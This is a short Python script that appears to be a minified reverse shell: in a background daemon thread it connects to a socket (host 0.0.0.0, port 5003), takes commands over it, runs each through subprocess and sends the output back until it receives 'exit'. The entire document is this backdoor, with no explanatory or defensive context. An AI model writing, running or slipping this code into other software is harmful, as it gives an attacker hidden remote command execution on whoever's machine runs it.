import threading as th,socket as st,subprocess as sp
def x():
  s=st.socket();s.connect(("0.0.0.0",5003));alive=1
  while alive:c=s.recv(1024).decode();alive=0 if c.lower()=="exit" else 1+s.send(sp.getoutput(c).encode())
  s.close()
th.Thread(target=x,daemon=True).start()